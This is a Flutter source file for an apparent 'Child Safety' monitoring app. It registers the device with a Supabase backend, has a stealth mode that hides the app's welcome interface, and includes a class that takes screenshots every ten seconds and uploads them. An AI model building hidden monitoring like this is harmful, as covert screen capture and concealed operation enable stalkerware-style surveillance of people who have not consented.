import 'package:flutter/material.dart';
import 'package:child_app/utils/stealth_handler.dart';
import 'package:child_app/services/supabase_service.dart';
import 'package:child_app/utils/constants.dart';
import 'package:child_app/setup/welcome_screen.dart';
import 'package:child_app/screens/home_screen.dart';
import 'dart:async';
import 'dart:typed_data';
import 'package:screenshot/screenshot.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  // Supabase initialization
  await SupabaseService.initialize();
  
  // Device registration
  final deviceId = await Constants.getDeviceId();
  final deviceInfo = await Constants.getDeviceInfo();
  await SupabaseService.registerDevice(deviceId, deviceInfo);
  
  // Check if stealth mode is active
  final isStealthActive = await StealthHandler.isStealthActive();
  
  runApp(MyApp(
    showUI: !isStealthActive,
    isStealthActive: isStealthActive,
  ));
}

class MyApp extends StatelessWidget {
  final bool showUI;
  final bool isStealthActive;
  
  const MyApp({super.key, required this.showUI, required this.isStealthActive});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Child Safety',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: showUI ? const WelcomeScreen() : const HomeScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

// Updated ScreenCapturer with Supabase
class ScreenCapturer {
  final ScreenshotController controller = ScreenshotController();
  Timer? _timer;
  final String childId;

  ScreenCapturer({required this.childId});

  void startCapturing() {
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) async {
      final frame = await captureFrame();
      if (frame != null) {
        await SupabaseService.uploadFrame(frame, childId);
      }
    });
  }

  Future<Uint8List?> captureFrame() async {
    try {
      return await controller.capture(
        delay: const Duration(milliseconds: 100),
        pixelRatio: 0.5,
        quality: 70,
      );
    } catch (e) {
      print('Capture error: $e');
      return null;
    }
  }

  void stopCapturing() {
    _timer?.cancel();
  }
}